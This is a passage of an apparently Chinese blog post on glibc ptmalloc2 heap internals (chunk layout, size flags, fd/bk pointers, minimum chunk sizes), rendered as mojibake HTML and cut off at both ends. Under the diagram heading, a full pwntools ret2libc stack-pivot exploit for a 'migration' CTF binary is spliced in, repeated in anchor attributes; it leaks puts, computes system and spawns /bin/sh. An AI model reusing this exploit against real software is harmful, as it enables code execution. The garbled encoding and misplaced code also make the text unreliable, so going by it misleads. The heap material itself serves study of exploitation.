†å¯ä»¥ç”³è¯·åˆ°çš„å†…å­˜ç©ºé—´æ¯”æ ˆè¦å¤§å¾ˆå¤šï¼Œåœ¨ linux çš„ 4G çš„è™šæ‹Ÿå†…å­˜ç©ºé—´é‡Œæœ€é«˜å¯ä»¥è¾¾åˆ° 2.9 G çš„ç©ºé—´<blockquote><p>å¯¹å †æ“ä½œçš„<strong>æ˜¯ç”±å †ç®¡ç†å™¨ï¼ˆptmalloc2ï¼‰æ¥å®ç°çš„ï¼Œè€Œä¸æ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸</strong>ã€‚å› ä¸ºç¨‹åºæ¯æ¬¡ç”³è¯·æˆ–è€…é‡Šæ”¾å †æ—¶éƒ½éœ€è¦è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œç³»ç»Ÿè°ƒç”¨çš„å¼€é”€å·¨å¤§ï¼Œå½“é¢‘ç¹è¿›è¡Œå †æ“ä½œæ—¶ï¼Œå°±ä¼šä¸¥é‡å½±å“ç¨‹åºçš„æ€§èƒ½</p></blockquote></li></ul><p>ä¸‹é¢çš„åˆ†æéƒ½æ˜¯ä»¥ <strong>glibc åº“ä¸‹çš„ ptmalloc2 å †ç®¡ç†å™¨</strong>æ¥è®²è§£çš„ã€‚</p><h2 id="ä¸€ã€å †çš„åŸºæœ¬ç»“æ„"><a href="#ä¸€ã€å †çš„åŸºæœ¬ç»“æ„" class="headerlink" title="ä¸€ã€å †çš„åŸºæœ¬ç»“æ„"></a>ä¸€ã€å †çš„åŸºæœ¬ç»“æ„</h2><p>å…ˆç®€å•çš„ç”»ä¸€ä¸ªå›¾å§ï¼š<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225175239.png" alt="Pasted image 20250225175239"></p><h3 id="å †çš„ç»“æ„"><a href="#å †çš„ç»“æ„" class="headerlink" title="å †çš„ç»“æ„"></a>å †çš„ç»“æ„</h3><p><code>malloc_chunk</code>çš„ç»“æ„</p><h4 id="malloc-chunkç»“æ„"><a href="#malloc-chunkç»“æ„" class="headerlink" title="malloc_chunkç»“æ„"></a>malloc_chunkç»“æ„</h4><p>æ¯ä¸ªç¨‹åºåˆ†é…çš„å†…å­˜ï¼ˆè¿™é‡ŒæŒ‡çš„æ˜¯mallocå‡½æ•°ï¼‰åœ¨å†…éƒ¨è¢«ä¸€ä¸ªå«åšâ€<strong>å †å—</strong>â€çš„æ‰€æ›¿ä»£ã€‚<strong>ä¸€ä¸ªå †å—æ˜¯ç”±å…ƒæ•°æ®å’Œç¨‹åºè¿”å›çš„å†…å­˜ç»„æˆçš„ï¼ˆå®é™…ä¸Šå†…å­˜æ˜¯mallocçš„è¿”å›å€¼ï¼‰</strong>ã€‚æ‰€æœ‰çš„è¿™äº›å †å—éƒ½æ˜¯ä¿å­˜åœ¨å †ä¸Šï¼Œè¿™å—å†…å­˜åŒºåŸŸåœ¨ç”³è¯·æ–°çš„å†…å­˜æ—¶ä¼šä¸æ–­çš„æ‰©å¤§ã€‚åŒæ ·ï¼Œå½“ä¸€å®šæ•°é‡çš„å†…å­˜é‡Šæ”¾æ—¶ï¼Œå †å¯ä»¥æ”¶ç¼©ã€‚åœ¨glibcæºç ä¸­å®šä¹‰çš„å †å—å¦‚ä¸‹ï¼š<br><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">&#x2F;*  This struct declaration is misleading (but accurate and necessary).  It declares a &quot;view&quot; into memory allowing access to necessary  fields at known offsets from a given base. See explanation below.*&#x2F;struct malloc_chunk &#123;  INTERNAL_SIZE_T      prev_size;  &#x2F;* Size of previous chunk (if free).  *&#x2F;  INTERNAL_SIZE_T      size;       &#x2F;* Size in bytes, including overhead. *&#x2F;  struct malloc_chunk* fd;         &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk;  &#x2F;* Only used for large blocks: pointer to next larger size.  *&#x2F;  struct malloc_chunk* fd_nextsize; &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk_nextsize;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>å‡è®¾å†…å­˜ä¸­æ²¡æœ‰å †å—é‡Šæ”¾ï¼Œæ–°åˆ†é…çš„å†…å­˜åŒºåŸŸç´§éšä¹‹å‰ç”³è¯·çš„å †å—åã€‚å› æ­¤å¦‚æœä¸€ä¸ªç¨‹åºä¾æ¬¡è°ƒç”¨malloc(256),malloc(512),ä»¥åŠmalloc(1024), å†…å­˜å¸ƒå±€å¦‚ä¸‹:<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225200003.png" alt="Pasted image 20250225200003"><br>åœ¨å †å—ä¹‹é—´çš„â€.â€æ˜¯è™šæ‹Ÿçš„è¾¹ç•Œï¼Œå®é™…å½“ä¸­ä»–ä»¬æ˜¯å½¼æ­¤ç›¸é‚»çš„ã€‚ä½ å¯èƒ½ä¼šé—®ï¼Œä¸ºä½•æˆ‘è¦åœ¨å¸ƒå±€å½“ä¸­åŒ…å«ä¸€ä¸ªâ€é¡¶å—â€å…ƒæ•°æ®ï¼ˆtop chunkï¼‰ã€‚<strong>é¡¶çº§å—è¡¨ç¤ºå †ä¸­å¯åˆ©ç”¨çš„å†…å­˜ï¼Œè€Œä¸”æ˜¯å”¯ä¸€çš„å¯ä»¥å¤§å°å¯ä»¥ç”Ÿé•¿çš„å †å—</strong>ã€‚å½“ç”³è¯·æ–°çš„å†…å­˜æ—¶ï¼Œé¡¶å—åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€ä¸ªéƒ¨åˆ†å˜æˆæ‰€ç”³è¯·çš„å †å—ï¼Œç¬¬äºŒä¸ªéƒ¨åˆ†å˜ä¸ºæ–°çš„é¡¶å—ï¼ˆå› æ­¤é¡¶å—å¤§å°å¯ä»¥æ”¶ç¼©ï¼‰ã€‚å¦‚æœé¡¶å—ä¸èƒ½å¤Ÿæ»¡è¶³ç”³è¯·çš„å†…å­˜åŒºåŸŸå¤§å°ï¼Œç¨‹åºå°±ä¼šè¦æ±‚æ“ä½œç³»ç»Ÿæ‰©å¤§é¡¶å—ï¼ˆè®©å †ç»§ç»­ç”Ÿé•¿ï¼‰ã€‚è¢«é‡Šæ”¾çš„chunkè¢«è®°å½•åœ¨é“¾è¡¨ä¸­ï¼ˆå¯èƒ½æ˜¯å¾ªç¯åŒå‘é“¾è¡¨ï¼Œä¹Ÿå¯èƒ½æ˜¯å•å‘é“¾è¡¨)ã€‚å…·ä½“ç»“æ„å¦‚ä¸‹<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225200210.png" alt="Pasted image 20250225200210"><br>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç‰©ç†ç›¸é‚»çš„ä¸¤ä¸ªç©ºé—²chunkä¼šè¢«åˆå¹¶ä¸ºä¸€ä¸ªchunkã€‚å †ç®¡ç†å™¨ä¼šé€šè¿‡prev_sizeå­—æ®µä»¥åŠsizeå­—æ®µåˆå¹¶ä¸¤ä¸ªç‰©ç†ç›¸é‚»çš„ç©ºé—²chunkå—ã€‚</p><h4 id="1-pre-sizeå­—æ®µ"><a href="#1-pre-sizeå­—æ®µ" class="headerlink" title="1. pre sizeå­—æ®µ"></a>1. pre sizeå­—æ®µ</h4><blockquote><p>å…¨ç§°previous size</p></blockquote><p>  å¦‚æœè¯¥ chunk çš„ç‰©ç†ç›¸é‚»çš„å‰ä¸€åœ°å€ chunkï¼ˆä¸¤ä¸ªæŒ‡é’ˆçš„åœ°å€å·®å€¼ä¸ºå‰ä¸€ chunk å¤§å°ï¼‰æ˜¯<strong>ç©ºé—²</strong>çš„è¯ï¼Œ<strong>é‚£è¯¥å­—æ®µè®°å½•çš„æ˜¯å‰ä¸€ä¸ª chunk çš„*</strong>å¤§å°<strong>* (</strong>åŒ…æ‹¬ chunk å¤´<strong>)ã€‚å¦åˆ™ï¼Œ</strong>è¯¥å­—æ®µå¯ä»¥ç”¨æ¥å­˜å‚¨ç‰©ç†ç›¸é‚»çš„å‰ä¸€ä¸ª chunk çš„æ•°æ®<strong>ã€‚è¿™é‡Œçš„å‰ä¸€ chunk æŒ‡çš„æ˜¯è¾ƒä½åœ°å€çš„ chunkã€‚</strong>å‰é¢ä¸€ä¸ªå †å—åœ¨ä½¿ç”¨æ—¶å¹¶ä¸”pre_sizeä¸ºå‚¨å­˜å‰é¢chunkçš„æ•°æ®æ—¶ï¼Œå®ƒçš„å€¼å§‹ç»ˆä¸º0**</p><h4 id="2-size-å­—æ®µ"><a href="#2-size-å­—æ®µ" class="headerlink" title="2. size å­—æ®µ"></a>2. size å­—æ®µ</h4><p><strong>ç”¨æ¥æŒ‡ç¤ºå½“å‰å †å—çš„å¤§å°çš„ï¼ˆå¤´éƒ¨åŠ ä¸Šï¼ˆpre_size+sizeï¼‰ +user data çš„å¤§å°ï¼‰</strong>ã€‚<br>å¤§å°å¿…é¡»æ˜¯ 2 <em> SIZE_SZ çš„æ•´æ•°å€ã€‚å¦‚æœç”³è¯·çš„å†…å­˜å¤§å°ä¸æ˜¯ 2 </em> SIZE_SZ çš„æ•´æ•°å€ï¼Œä¼šè¢«è½¬æ¢æ»¡è¶³å¤§å°çš„æœ€å°çš„ 2 <em> SIZE_SZ çš„å€æ•°ã€‚<br><strong>32 ä½ç³»ç»Ÿä¸­ï¼ŒSIZE_SZ æ˜¯ 4ï¼›</strong><br><strong>64 ä½ç³»ç»Ÿä¸­ï¼ŒSIZE_SZ æ˜¯ 8ã€‚</strong> </em>è¯¥å­—æ®µçš„ä½ä¸‰ä¸ªæ¯”ç‰¹ä½å¯¹ chunk çš„å¤§å°æ²¡æœ‰å½±å“<em>ï¼Œå®ƒä»¬ä»é«˜åˆ°ä½åˆ†åˆ«è¡¨ç¤º<br>ä½†æ˜¯è¿™ä¸ªå­—æ®µçš„æœ€å<em>*ä¸‰ä½</em></em>ç›¸å½“äºä¸‰ä¸ª flag ï¼Œè¿™ä¸‰ä½çš„ä½œç”¨åˆ†åˆ«æ˜¯ï¼š</p><ol><li><code>NON_MAIN_ARENA</code>ï¼Œè®°å½•å½“å‰ chunk æ˜¯å¦ä¸å±äº<strong>ä¸»åˆ†é…åŒºï¼ˆä¸»çº¿ç¨‹ï¼‰</strong>ï¼Œ1 è¡¨ç¤ºä¸å±äºï¼ˆæ˜¯éä¸»åˆ†é…åŒº/éä¸»çº¿ç¨‹ï¼‰ï¼Œ0 è¡¨ç¤ºå±äºã€‚</li><li><code>IS_MAPPED</code>ï¼Œè¡¨ç¤ºå½“å‰chunkæ˜¯ä»å“ªä¸ªå†…å­˜åŒºåŸŸè·å¾—çš„è™šæ‹Ÿå†…å­˜ã€‚ä¸º1è¡¨ç¤ºè¯¥chunkæ˜¯ä»<strong>mmap</strong>æ˜ å°„åŒºåŸŸåˆ†é…çš„ï¼Œå¦åˆ™æ˜¯ä»<strong>heap</strong>åŒºåŸŸåˆ†é…çš„</li><li><code>PREV_INUSE</code>ï¼Œè®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª chunk çš„ size çš„ P ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—² chunk ä¹‹é—´çš„åˆå¹¶ã€‚<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250225180103.png" alt="Pasted image 20250225180103"><br>è¿™é‡Œé‡ç‚¹è®²è§£æœ€åä¸€ä½ï¼š<strong>ç”¨æ¥è®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ï¼Œè¢«åˆ†é…çš„è¯è¿™ä¸ªå­—æ®µçš„å€¼ä¸º 1</strong>ï¼Œæ‰€ä»¥ç»å¸¸ä¼šåœ¨å·²åˆ†é…çš„å †å—ä¸­çš„ size å­—æ®µä¸­å‘ç°å€¼æ¯”åŸæ¥å¤§ 1 ä¸ªå­—èŠ‚ã€‚<blockquote><p>æ‰€ä»¥å‰ä¸€ä¸ªå †å—çš„é‡Šæ”¾ä¸å¦éƒ½å’Œè¿™ä¸¤ä¸ªå­—æ®µï¼ˆpre_sizeã€sizeï¼‰çš„å€¼æœ‰å…³ï¼Œè¿™æ˜¯å› ä¸ºä¾¿äºå†…å­˜çš„é‡Šæ”¾æ“ä½œï¼ˆfreeï¼‰</p></blockquote></li></ol><h4 id="3-user-data"><a href="#3-user-data" class="headerlink" title="3. user data"></a>3. user data</h4><p>é¡¾åæ€ä¹‰å°±æ˜¯ç”¨æ¥å­˜æ”¾ç”¨æˆ·æ•°æ®çš„ã€‚<br>ä½¿ç”¨mallocå‡½æ•°åˆ†é…åˆ°çš„å†…å­˜çš„è¿”å›å€¼æŒ‡é’ˆæ˜¯<strong>æŒ‡å‘userdataï¼ˆç”¨æˆ·æ•°æ®åŒºï¼‰</strong><br>ä¾‹å¦‚åœ¨ 64 ä½ç¨‹åºä¸­ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">malloc(8)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>ç”³è¯·åˆ°çš„å †å—æ€»å¤§å°ä¸º<code>16 + 8 + 8 + 1 = 0x21(byte)</code></p><ol><li>ç¬¬ä¸€ä¸ª16å­—èŠ‚æ˜¯ç³»ç»Ÿæœ€å°åˆ†é…çš„å†…å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ å¦‚æœæƒ³è¦ç”³è¯·çš„å†…å­˜å°äºç³»ç»Ÿæœ€å°åˆ†é…çš„å†…å­˜çš„è¯ï¼Œå°±ä¼šæŒ‰ç…§æœ€å°çš„å†…å­˜æ¥åˆ†é…ã€‚</li></ol><ul><li>åœ¨64ä½ç³»ç»Ÿä¸­è¿™ä¸ªå€¼æ˜¯16ä¸ªå­—èŠ‚ï¼Œåœ¨32ä½ç³»ç»Ÿä¸­æ˜¯8ä¸ªå­—èŠ‚</li><li>ä¾‹å¦‚ï¼Œå¦‚æœä»£ç ä¸­æ˜¯malloc(0)çš„è¯ï¼Œå †ç®¡ç†å™¨ä¹Ÿä¼šåˆ†é…æœ€å°å†…å­˜ç©ºé—´ç»™ä½ </li></ul><ol><li>ç¬¬äºŒä¸ª8å­—èŠ‚æ˜¯pre sizeå­—æ®µçš„å¤§å°(32ä½çš„ä¸º4å­—èŠ‚)</li><li>ç¬¬ä¸‰ä¸ª8å­—èŠ‚ä¸º sizeå­—æ®µçš„å¤§å°ï¼ˆ32ä½çš„ä¸º4å­—èŠ‚)</li><li>æœ€åä¸€ä¸ª1å­—èŠ‚æ˜¯<strong>PREV_INUSEçš„å€¼ï¼Œåªæœ‰0æˆ–1ä¸¤ä¸ªå€¼</strong><blockquote><p>æ•´ç†ä¸€ä¸‹ï¼š<strong>å †çš„åŸºæœ¬ç»“æ„åŒ…æ‹¬pre_sizeã€sizeã€userdata</strong><br><strong>sizeå­—æ®µåŒ…æ‹¬</strong>:å¤´éƒ¨(pre size+size)åŠ ä¸Š user data çš„å¤§å°<br>mallocå‡ºæœ€å°å¤§å°ä¸ºï¼šç³»ç»Ÿæœ€å°åˆ†é…å†…å­˜+pre_sizeå­—æ®µ+sizeå­—æ®µ+prev_inuse(æ­¤å¤„å­˜ç–‘ï¼‰</p><h3 id="ç»“æ„å›¾"><a href="#ç»“æ„å›¾" class="headerlink" title="ç»“æ„å›¾"></a>ç»“æ„å›¾</h3><h4 id="xxxxxxxxxx38-1from-pwn-import-2â€‹3io-process-â€˜-migrationâ€™-4elf-ELF-â€˜-migrationâ€™-5libc-ELF-â€˜-lib-i386-linux-gnu-libc-so-6â€™-6context-log-level-â€debugâ€-7â€‹8buf-elf-bss-0x5009buf1-elf-bss-0x40010print-hex-buf1-11read-plt-elf-plt-â€˜readâ€™-12leave-ret-0x0804850413-0x08048504-leave-ret14payload1-bâ€™aâ€™-0x28-p32-buf-p32-read-plt-p32-leave-ret-p32-0-p32-buf-p32-0x100-15io-sendafter-bâ€™best-nâ€™-payload1-16â€‹17puts-plt-elf-plt-â€˜putsâ€™-18pop-ebx-ret-0x804836d19puts-got-elf-got-â€˜putsâ€™-20â€‹21payload2-p32-buf1-p32-puts-plt-p32-pop-ebx-ret-p32-puts-got-22payload2-p32-read-plt-p32-leave-ret-p32-0-p32-buf1-p32-0x100-23-24io-sendline-payload2-25-26puts-addr-u32-io-recv-4-27success-â€œputs-addr-gt-â€œ-hex-puts-addr-28libc-base-puts-addr-libc-symbols-â€˜putsâ€™-29system-addr-libc-base-libc-symbols-â€˜systemâ€™-30print-hex-system-addr-31-32pop3ret-0x0804856933payload3-p32-buf-p32-read-plt-p32-pop3ret-p32-0-p32-buf-p32-0x100-34payload3-p32-system-addr-p32-0xdeadbeef-p32-buf-35â€‹36io-sendline-payload3-37io-sendline-â€œ-bin-sh-0â€-38io-interactive-python"><a href="#xxxxxxxxxx38-1from-pwn-import-2â€‹3io-process-â€˜-migrationâ€™-4elf-ELF-â€˜-migrationâ€™-5libc-ELF-â€˜-lib-i386-linux-gnu-libc-so-6â€™-6context-log-level-â€debugâ€-7â€‹8buf-elf-bss-0x5009buf1-elf-bss-0x40010print-hex-buf1-11read-plt-elf-plt-â€˜readâ€™-12leave-ret-0x0804850413-0x08048504-leave-ret14payload1-bâ€™aâ€™-0x28-p32-buf-p32-read-plt-p32-leave-ret-p32-0-p32-buf-p32-0x100-15io-sendafter-bâ€™best-nâ€™-payload1-16â€‹17puts-plt-elf-plt-â€˜putsâ€™-18pop-ebx-ret-0x804836d19puts-got-elf-got-â€˜putsâ€™-20â€‹21payload2-p32-buf1-p32-puts-plt-p32-pop-ebx-ret-p32-puts-got-22payload2-p32-read-plt-p32-leave-ret-p32-0-p32-buf1-p32-0x100-23-24io-sendline-payload2-25-26puts-addr-u32-io-recv-4-27success-â€œputs-addr-gt-â€œ-hex-puts-addr-28libc-base-puts-addr-libc-symbols-â€˜putsâ€™-29system-addr-libc-base-libc-symbols-â€˜systemâ€™-30print-hex-system-addr-31-32pop3ret-0x0804856933payload3-p32-buf-p32-read-plt-p32-pop3ret-p32-0-p32-buf-p32-0x100-34payload3-p32-system-addr-p32-0xdeadbeef-p32-buf-35â€‹36io-sendline-payload3-37io-sendline-â€œ-bin-sh-0â€-38io-interactive-python" class="headerlink" title="xxxxxxxxxx38 1from pwn import 2â€‹3io=process(â€˜./migrationâ€™)4elf=ELF(â€˜./migrationâ€™)5libc=ELF(â€˜/lib/i386-linux-gnu/libc.so.6â€™)6context.log_level=â€debugâ€  7â€‹8buf=elf.bss()+0x5009buf1=elf.bss()+0x40010print(hex(buf1))11read_plt=elf.plt[â€˜readâ€™]12leave_ret=0x0804850413# 0x08048504 : leave ; ret14payload1=bâ€™aâ€™(0x28)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf)+p32(0x100)15io.sendafter(bâ€™best :\nâ€™,payload1)16â€‹17puts_plt=elf.plt[â€˜putsâ€™]18pop_ebx_ret=0x804836d19puts_got=elf.got[â€˜putsâ€™]20â€‹21payload2=p32(buf1)+p32(puts_plt)+p32(pop_ebx_ret)+p32(puts_got)22payload2+=p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf1)+p32(0x100)23  24io.sendline(payload2)25  26puts_addr=u32(io.recv(4))  27success(â€œputs_addr ==&gt; â€œ+hex(puts_addr))28libc_base=puts_addr-libc.symbols[â€˜putsâ€™]29system_addr=libc_base+libc.symbols[â€˜systemâ€™]30print(hex(system_addr))31  32pop3ret=0x0804856933payload3=p32(buf)+p32(read_plt)+p32(pop3ret)+p32(0)+p32(buf)+p32(0x100)34payload3+=p32(system_addr)+p32(0xdeadbeef)+p32(buf)35â€‹36io.sendline(payload3)37io.sendline(â€œ/bin/sh\0â€)38io.interactive()python"></a>xxxxxxxxxx38 1from pwn import <em>2â€‹3io=process(â€˜./migrationâ€™)4elf=ELF(â€˜./migrationâ€™)5libc=ELF(â€˜/lib/i386-linux-gnu/libc.so.6â€™)6context.log_level=â€debugâ€  7â€‹8buf=elf.bss()+0x5009buf1=elf.bss()+0x40010print(hex(buf1))11read_plt=elf.plt[â€˜readâ€™]12leave_ret=0x0804850413# 0x08048504 : leave ; ret14payload1=bâ€™aâ€™</em>(0x28)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf)+p32(0x100)15io.sendafter(bâ€™best :\nâ€™,payload1)16â€‹17puts_plt=elf.plt[â€˜putsâ€™]18pop_ebx_ret=0x804836d19puts_got=elf.got[â€˜putsâ€™]20â€‹21payload2=p32(buf1)+p32(puts_plt)+p32(pop_ebx_ret)+p32(puts_got)22payload2+=p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf1)+p32(0x100)23  24io.sendline(payload2)25  26puts_addr=u32(io.recv(4))  27success(â€œputs_addr ==&gt; â€œ+hex(puts_addr))28libc_base=puts_addr-libc.symbols[â€˜putsâ€™]29system_addr=libc_base+libc.symbols[â€˜systemâ€™]30print(hex(system_addr))31  32pop3ret=0x0804856933payload3=p32(buf)+p32(read_plt)+p32(pop3ret)+p32(0)+p32(buf)+p32(0x100)34payload3+=p32(system_addr)+p32(0xdeadbeef)+p32(buf)35â€‹36io.sendline(payload3)37io.sendline(â€œ/bin/sh\0â€)38io.interactive()python</h4><p><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226142821.png" alt="Pasted image 20250226142821"></p><h4 id="ç©ºé—²ä¸­ï¼ˆé‡Šæ”¾åï¼‰"><a href="#ç©ºé—²ä¸­ï¼ˆé‡Šæ”¾åï¼‰" class="headerlink" title="ç©ºé—²ä¸­ï¼ˆé‡Šæ”¾åï¼‰"></a>ç©ºé—²ä¸­ï¼ˆé‡Šæ”¾åï¼‰</h4></blockquote></li><li>ç©ºé—²ä¸­çš„chunkä¸å­˜åœ¨MçŠ¶æ€ï¼Œåªæœ‰A|PçŠ¶æ€</li><li><strong>user dataå¤´éƒ¨</strong>è¢«åˆ†é…å‡ºä¸¤ä¸ªæˆå‘˜ï¼Œfdå’Œbk<br><img src="/2025/02/26/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86/Pasted image 20250226153753.png" alt="Pasted image 20250226153753"><br><code>fd</code>ï¼Œ<code>bk</code>ã€‚ chunk å¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œä» fd å­—æ®µå¼€å§‹æ˜¯ç”¨æˆ·çš„æ•°æ®ã€‚chunk ç©ºé—²æ—¶ï¼Œä¼šè¢«æ·»åŠ åˆ°å¯¹åº”çš„ç©ºé—²ç®¡ç†é“¾è¡¨ä¸­ï¼Œå…¶å­—æ®µçš„å«ä¹‰å¦‚ä¸‹</li></ol><ul><li><code>fd</code> æŒ‡å‘å‰ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk çš„èµ·å§‹åœ°å€ï¼Œ32ä½å 4å­—èŠ‚ï¼Œ64ä½å 8å­—èŠ‚</li><li><code>bk</code> æŒ‡å‘åä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk çš„èµ·å§‹åœ°å€ï¼Œ32ä½å 4å­—èŠ‚ï¼Œ64ä½å 8å­—èŠ‚</li><li>é€šè¿‡ fd å’Œ bk å¯ä»¥å°†ç©ºé—²çš„ chunk å—åŠ å…¥åˆ°ç©ºé—²çš„ chunk å—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç†</li></ul><blockquote><p>äº‹å®ä¸Šï¼Œé‡Šæ”¾åçš„<strong>large block</strong>ä¸­è¿˜å­˜åœ¨å¦å¤–ä¸¤ä¸ªæˆå‘˜ï¼š<strong>fd_nextsize</strong>å’Œ<strong>bk_nextsize</strong></p></blockquote><p><code>fd_nextsize</code>ï¼Œ <code>bk_nextsize</code>ï¼Œä¹Ÿæ˜¯åªæœ‰ chunk ç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„ chunkï¼ˆlarge chunkï¼‰ã€‚</p><ul><li><strong>fd_nextsize</strong> æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œ<strong>ä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</strong>ã€‚</li><li><strong>bk_nextsize</strong> æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œ<strong>ä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</strong>ã€‚  <blockquote><p>ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†ã€‚</p></blockquote></li></ul><h3 id="å †å—å¤§å°"><a href="#å †å—å¤§å°" class="headerlink" title="å †å—å¤§å°"></a>å †å—å¤§å°</h3><ul><li><p>32ä½ç¨‹åºï¼š</p><ol><li>ç”¨æˆ·åˆ†é…åˆ°çš„æœ€å°å †å—å¤§å°ä¸º<code>17B</code>ï¼š<strong>prev_size(4B) + size(4B) + fd(4B) + bk(4B) + next_chunk-&gt;p(1B)</strong></li><li>è‹¥ç”¨æˆ·ç”³è¯·çš„å¤§å°è¶…è¿‡æœ€å°å †å—å¤§å°ï¼Œä¼šä¸<strong>8B</strong>è¿›è¡Œå¯¹é½</li></ol></li><li><p>64ä½ç¨‹åºï¼š</p><ol><li>ç”¨æˆ·åˆ†é…åˆ°çš„æœ€å°å †å—å¤§å°ä¸º<code>33B</code>ï¼š<strong>prev_size(8B) + size(8B) + fd(8B) + bk(8B) + next_chunk-&gt;p(1B)</strong></li><li>è‹¥ç”¨æˆ·ç”³è¯·çš„å¤§å°è¶…è¿‡æœ€å°å †å—å¤§å°ï¼Œä¼šä¸<strong>16B</strong>è¿›è¡Œå¯¹é½<h3 id="ç©ºé—´å¤ç”¨"><a href="#ç©ºé—´å¤ç”¨" class="headerlink" title="ç©ºé—´å¤ç”¨"></a>ç©ºé—´å¤ç”¨</h3><strong>æè¿°</strong>ï¼š<strong>å½“ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€æ—¶ï¼Œå®ƒçš„ä¸‹ä¸€ä¸ª chunk çš„ prev_size æ— æ•ˆ</strong>ã€‚æ‰€ä»¥ä¸‹ä¸€ä¸ª chunk çš„ prev_size ä¹Ÿå¯ä»¥è¢«å½“å‰ chunk ä½¿ç”¨ï¼Œè¿™å°±æ˜¯ chunk çš„ç©ºé—´å¤ç”¨</li></ol></li></ul><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of previous chunk, if unallocated (P clear)  |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of chunk, in bytes                     |A|M|P|  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             User data starts here...                          .        .                                                               .        .             (malloc_usable_size() bytes)                      .next    .                                                               |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             (size of chunk, but used for application data)    |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of next chunk, in bytes                |A|0|1|        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="äºŒã€æŒ‡é’ˆä¸åœ°å€"><a href="#äºŒã€æŒ‡é’ˆä¸åœ°å€" class="headerlink" title="äºŒã€æŒ‡é’ˆä¸åœ°å€"></a>äºŒã€æŒ‡é’ˆä¸åœ°å€</h2><p>é¦–å…ˆè¦æ˜ç¡®ç”¨æˆ·åœ¨è°ƒç”¨ malloc å‡½æ•°æ—¶è¿”å›çš„å€¼ä¸º<strong>ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘åˆ†é…åˆ°å 